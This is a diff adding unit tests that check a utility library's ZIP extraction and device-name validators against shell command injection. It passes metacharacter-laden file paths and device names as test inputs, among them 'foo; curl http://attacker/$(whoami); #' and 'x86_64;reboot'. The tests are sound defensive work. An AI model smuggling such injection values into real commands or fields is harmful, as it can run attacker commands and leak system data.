@@ -459,6 +459,97 @@ describe('CommonUtils', () => {
         });
     });
 
+    describe('extractZIPArchive', () => {
+        it('runs unzip on POSIX passing paths as inert argv elements (no shell)', async () => {
+            stubMethod($$.SANDBOX, process, 'platform').value('darwin');
+            const spawnStub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({
+                stdout: '',
+                stderr: ''
+            });
+
+            // A metacharacter-laden path would inject if concatenated into a shell string.
+            const zip = '/tmp/ev;il/$(id).zip';
+            const outDir = '/tmp/out;dir';
+            await CommonUtils.extractZIPArchive(zip, outDir);
+
+            const expectedArchive = CommonUtils.convertToUnixPath(path.resolve(CommonUtils.resolveUserHomePath(zip)));
+            const expectedOutDir = CommonUtils.convertToUnixPath(path.resolve(CommonUtils.resolveUserHomePath(outDir)));
+
+            expect(spawnStub.calledOnce).to.be.true;
+            expect(spawnStub.getCall(0).args[0]).to.equal('unzip');
+            // Each path is its own argv element; the injection payload never becomes shell syntax.
+            expect(spawnStub.getCall(0).args[1]).to.deep.equal(['-o', '-qq', expectedArchive, '-d', expectedOutDir]);
+        });
+
+        it('runs Expand-Archive on Windows with PowerShell-single-quoted paths', async () => {
+            stubMethod($$.SANDBOX, process, 'platform').value('win32');
+            const spawnStub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({
+                stdout: '',
+                stderr: ''
+            });
+
+            // Embedded single quote must be doubled ('' ) so it can't close the PS literal string.
+            const zip = "/tmp/ev'il.zip";
+            await CommonUtils.extractZIPArchive(zip);
+
+            const expectedArchive = CommonUtils.convertToUnixPath(path.resolve(CommonUtils.resolveUserHomePath(zip)));
+
+            expect(spawnStub.calledOnce).to.be.true;
+            expect(spawnStub.getCall(0).args[0]).to.equal('powershell');
+            const psArgs = spawnStub.getCall(0).args[1] as string[];
+            expect(psArgs[0]).to.equal('-Command');
+            const script = psArgs[1];
+            expect(script).to.contain('Expand-Archive');
+            // The path appears single-quoted with its embedded quote doubled — never bare.
+            expect(script).to.contain(`'${expectedArchive.replace(/'/g, "''")}'`);
+        });
+
+        it('does not build a single shell-string command on POSIX', async () => {
+            // Guards against regressing to `unzip -o -qq ${archive} -d ${outDir}` via
+            // executeCommandAsync (a shell sink). extractZIPArchive must use spawnCommandAsync.
+            stubMethod($$.SANDBOX, process, 'platform').value('linux');
+            const execStub = stubMethod($$.SANDBOX, CommonUtils, 'executeCommandAsync').resolves({
+                stdout: '',
+                stderr: ''
+            });
+            stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({ stdout: '', stderr: '' });
+
+            await CommonUtils.extractZIPArchive('/tmp/a.zip', '/tmp/out');
+
+            expect(execStub.called).to.be.false;
+        });
+    });
+
+    describe('assertSafeDeviceName', () => {
+        it('accepts a legitimate device name with spaces, dots, underscores and hyphens', () => {
+            expect(() => CommonUtils.assertSafeDeviceName('Pixel 5_API-30.v2')).to.not.throw();
+        });
+
+        it('rejects a name containing shell metacharacters', () => {
+            const malicious = 'foo; curl http://attacker/$(whoami); #';
+            expect(() => CommonUtils.assertSafeDeviceName(malicious)).to.throw(/cannot be safely used/i);
+        });
+
+        it('rejects an empty name', () => {
+            expect(() => CommonUtils.assertSafeDeviceName('')).to.throw(/cannot be safely used/i);
+        });
+    });
+
+    describe('assertSafeDeviceIdentifier', () => {
+        it('accepts a legitimate identifier (dots, underscores, hyphens; no spaces)', () => {
+            expect(() => CommonUtils.assertSafeDeviceIdentifier('iPhone-8')).to.not.throw();
+            expect(() => CommonUtils.assertSafeDeviceIdentifier('iOS-17-2')).to.not.throw();
+        });
+
+        it('rejects an identifier containing a space', () => {
+            expect(() => CommonUtils.assertSafeDeviceIdentifier('iPhone 8')).to.throw(/cannot be safely used/i);
+        });
+
+        it('rejects an identifier containing shell metacharacters', () => {
+            expect(() => CommonUtils.assertSafeDeviceIdentifier('x86_64;reboot')).to.throw(/cannot be safely used/i);
+        });
+    });
+
     function createStats(isFile: boolean): fs.Stats {
         return {
             isFile() {
